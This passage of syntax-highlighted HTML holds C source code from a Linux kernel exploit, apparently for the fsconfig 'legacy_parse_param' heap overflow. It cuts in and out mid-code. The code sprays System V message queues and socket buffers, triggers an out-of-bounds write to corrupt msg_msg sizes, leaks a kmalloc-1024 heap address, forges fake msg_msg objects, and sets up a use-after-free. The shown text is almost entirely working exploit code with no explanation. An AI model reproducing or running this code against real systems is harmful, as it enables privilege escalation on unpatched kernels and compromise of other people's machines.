    <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_B2<span class="token punctuation">,</span>
           IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">init_sock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">socketpair</span><span class="token punctuation">(</span>AF_UNIX<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sock_pairs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"socketpair() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">bind_cpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">cpu_set_t</span> my_set<span class="token punctuation">;</span>
  <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>my_set<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>my_set<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>my_set<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"sched_setaffinity() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">call_fsopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">fsopen</span><span class="token punctuation">(</span><span class="token string">"ext4"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"fsopen() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> fd<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">spray_skbuff_data</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sock_pairs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"write to sock pairs failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">free_skbuff_data</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sock_pairs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"read from sock pairs failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">prepare_overflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"prepare fsconfig heap overflow"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xf</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token comment">// ",=" + buff</span>
    <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// ",=" + buff</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">do_leak_heap</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- do_leak_heap ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">prepare_overflow</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 1..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    msg_a<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_a<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 2..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_2<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> MSG_TAG<span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_b<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

    msg_b<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_B1<span class="token punctuation">;</span>
    n <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    msg_b<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_B2<span class="token punctuation">;</span>
    n <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgsnd() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"trigger oob write in `legacy_parse_param` to msg_msg.m_ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"0000000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// m_list.next</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"11111111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_list.prev</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token string">"22222222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_type</span>
  <span class="token class-name">uint64_t</span> target_size <span class="token operator">=</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>buff <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_size<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// m_ts</span>
  <span class="token function">fsconfig</span><span class="token punctuation">(</span>fsid<span class="token punctuation">,</span> FSCONFIG_SET_STRING<span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"searching corrupted msg_msg..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token class-name">size_t</span> n <span class="token operator">=</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a_oob<span class="token punctuation">,</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                      MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">continue</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> MSG_A_TEXT_SIZE <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      corrupted_msqid <span class="token operator">=</span> msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span>
          <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// call clean_msg_1 without crash</span>
        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

      <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>p <span class="token operator">=</span>
          <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>msg_a_oob<span class="token operator">-></span>mtext <span class="token operator">+</span> MSG_A_TEXT_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>m_type <span class="token operator">==</span> MTYPE_B1 <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>m_ts <span class="token operator">==</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> MSG_TAG<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          uaf_msqid <span class="token operator">=</span> msqid_2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"corrupted_msqid = %d"</span><span class="token punctuation">,</span> corrupted_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"uaf_msqid = %d"</span><span class="token punctuation">,</span> uaf_msqid<span class="token punctuation">)</span><span class="token punctuation">;</span>

          kmalloc_1024 <span class="token operator">=</span> p<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next<span class="token punctuation">;</span>

          <span class="token comment">// call clean_msg_2 without crash</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>mtext<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span>
                   <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        p<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">clean_msg_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>uaf_msqid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">loginfo</span><span class="token punctuation">(</span><span class="token string">"kmalloc_1024 = %#lx"</span><span class="token punctuation">,</span> kmalloc_1024<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">fake_msg_msg_at_kmalloc_1024</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- fake_msg_msg_at_kmalloc_1024 ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"free kmalloc-1024"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">msgrcv</span><span class="token punctuation">(</span>uaf_msqid<span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> <span class="token number">1024</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_B2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgrcv() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying skb..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>skb<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_FAKE<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  msg<span class="token operator">++</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>next <span class="token operator">=</span> kmalloc_1024<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_list<span class="token punctuation">.</span>prev <span class="token operator">=</span> kmalloc_1024 <span class="token operator">+</span> <span class="token number">0x400</span><span class="token punctuation">;</span> <span class="token comment">// no matter</span>
  msg<span class="token operator">-></span>m_type <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
  msg<span class="token operator">-></span>m_ts <span class="token operator">=</span> <span class="token number">0x233</span><span class="token punctuation">;</span>
  msg<span class="token operator">-></span>security <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

  <span class="token function">spray_skbuff_data</span><span class="token punctuation">(</span>skb<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>skb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">create_uaf</span><span class="token punctuation">(</span><span class="token keyword">int</span> fsid<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> target_idx <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"--- create_uaf ---"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">prepare_overflow</span><span class="token punctuation">(</span>fsid<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">logdebug</span><span class="token punctuation">(</span><span class="token string">"spraying messasge queue 1..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    msg_a<span class="token operator">-></span>mtype <span class="token operator">=</span> MTYPE_A<span class="token punctuation">;</span>
